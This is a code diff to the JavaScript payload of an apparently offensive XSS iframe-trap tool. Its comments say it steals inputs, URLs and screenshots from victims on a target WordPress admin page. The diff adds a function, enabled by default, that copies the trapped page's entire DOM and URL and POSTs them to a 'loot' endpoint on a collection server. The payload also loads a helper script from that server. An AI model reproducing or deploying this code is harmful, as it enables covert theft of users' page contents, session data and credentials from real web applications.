@@ -26,6 +26,9 @@ let setBackgroundImage = true;
 let startingPage = "https://targetapp.possiblymalware.com/wp-admin";
 
 
+// Should we exfil the entire DOM?
+let exfilDOM = true;
+
 
 
 // Helpful variables
@@ -384,6 +387,27 @@ function checkSessionStorage()
 
 
 
+// Optional, copy the entire dang dom, zip it, and send out
+function sendDOM()
+{
+	trapURL = document.getElementById("iframe_a").contentDocument.location.href;
+	trapDom = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
+
+	// console.log("TRAP DOM:");
+	// console.log(trapDom)
+
+	request = new XMLHttpRequest();
+	request.open("POST", "http://localhost:8444/loot/dom/" + sessionName);
+	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	var jsonObj = new Object();
+	jsonObj["url"] = trapURL;
+	jsonObj["dom"] = trapDom;
+	var jsonString = JSON.stringify(jsonObj);
+	request.send(jsonString);
+}
+
+
+
 // When this update fires, it checks the iframe trap URL
 // where the user thinks they are, then does a lot of things
 // Steals inputs, URL, screenshots, etc. 
@@ -421,6 +445,12 @@ function runUpdate()
 
 		// Handle input scraping
 		hookInputs();
+
+		// Exfil DOM
+		if (exfilDOM)
+		{
+			sendDOM();
+		}
 	}
 
 
@@ -519,6 +549,13 @@ var js = document.createElement("script");
 js.type = "text/javascript";
 js.src = "http://localhost:8444/lib/telemhelperlib.js";
 document.body.appendChild(js);
+
+
+// Pull in jszip
+// js = document.createElement("script");
+// js.type = "text/javascript";
+// js.src = "http://localhost:8444/lib/compress.js";
+// document.body.appendChild(js);
 
 
 // Pick our session ID
